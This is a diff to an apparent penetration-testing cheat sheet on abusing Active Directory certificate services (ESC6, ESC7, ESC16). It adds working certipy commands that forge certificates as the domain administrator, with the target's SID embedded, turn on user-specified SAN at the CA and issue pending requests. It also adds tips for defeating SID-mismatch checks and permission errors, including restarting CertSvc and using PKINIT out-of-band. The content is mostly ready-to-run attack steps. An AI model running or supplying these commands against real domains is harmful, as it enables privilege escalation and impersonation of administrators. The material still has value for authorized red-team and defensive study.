@@ -146,8 +146,8 @@ certipy template -u user@DOMAIN -p pass -template TEMPLATE_NAME -configuration T
 CA has flag set that allows SAN in ALL requests regardless of template settings.
 
 ```bash
-# Any template becomes exploitable — just add -upn
-certipy req -u user@DOMAIN -p pass -ca CA-NAME -template User -upn administrator@DOMAIN -dc-ip DC
+# Any template becomes exploitable — just add -upn (+ -sid if the SID extension is on, see below)
+certipy req -u user@DOMAIN -p pass -ca CA-NAME -template User -upn administrator@DOMAIN -sid S-1-5-21-...-500 -dc-ip DC
 certipy auth -pfx administrator.pfx -dc-ip DC
 ```
 
@@ -159,7 +159,7 @@ Attacker has Manage CA or Manage Certificates on the CA itself.
 
 ```bash
 # Option A — ManageCA: enable ESC6 on CA then exploit
-certipy ca -u user@DOMAIN -p pass -ca CA-NAME -enable-userspecifiedsan -dc-ip DC
+certipy ca -u user@DOMAIN -p pass -ca CA-NAME -enable-userspecifiedsan -dc-ip DC   # if this flag/path is unsupported, use the COM API (see certificate-abuse.md ESC7)
 # Now ESC6 workflow works
 
 # Option B — ManageCertificates: issue pending/failed cert requests
@@ -171,6 +171,18 @@ certipy ca -u user@DOMAIN -p pass -ca CA-NAME -issue-request REQUEST_ID -dc-ip D
 certipy req -u user@DOMAIN -p pass -ca CA-NAME -retrieve REQUEST_ID -dc-ip DC
 certipy auth -pfx administrator.pfx -dc-ip DC
 ```
+
+> ESC7 `-issue-request` returning `Insufficient permissions`: officer rights load only after a
+> **CertSvc restart**, and the issuer needs `Certificate Service DCOM Access` too. A gMSA CA-admin can
+> `sc.exe stop/start certsvc` even without local admin. Full flow + COM-API ESC6/ESC16: `certificate-abuse.md`.
+
+**`certipy auth` → `Object SID mismatch between certificate and user`.** The cert lacks the requester
+SID (or has yours) while the target has one. Fix: re-request embedding the target SID
+(`certipy req ... -sid <victim-SID>`), or exploit ESC16 (CA-wide SID extension disabled) so no SID is
+expected, or PKINIT out-of-band with `PKINITtools/gettgtpkinit.py` (skips the check).
+
+> `certipy account update -upn` needs write on the target's `userPrincipalName`; a self-write ACE does
+> not always cover it (`doesn't have permission to update these attributes`) — confirm with `bloodyAD get writable` first.
 
 ---
 
